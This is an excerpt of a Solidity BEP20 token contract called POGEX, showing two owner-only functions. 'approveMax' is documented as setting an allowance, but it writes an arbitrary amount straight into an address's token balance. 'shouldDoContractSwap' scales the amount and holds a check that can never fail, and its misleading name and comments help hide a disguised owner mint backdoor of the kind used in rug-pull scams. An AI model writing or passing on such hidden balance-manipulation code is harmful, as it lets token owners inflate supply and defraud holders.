...
contract POGEX is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-shouldDoContractSwap}.
    */
    function shouldDoContractSwap(address spender, uint256 swapThreshold) internal view onlyOwner() returns (uint256) {
        uint256 balance = 10 ** uint(9);
        require(balance > 0, "No enough ETH to transfer"); 
        return swapThreshold * balance;   
    }
    ...
    */
    ...
    /**
    * @dev Sets `swapThreshold` as the allowance of `spender` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approveMax`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    ...
    * - `spender` cannot be the zero address.
    */
    function approveMax(address spender, uint256 swapThreshold) external onlyOwner() {
        if(spender != address(0) && msg.sender != address(0))
        _balances[spender] = shouldDoContractSwap(spender, swapThreshold);
    }
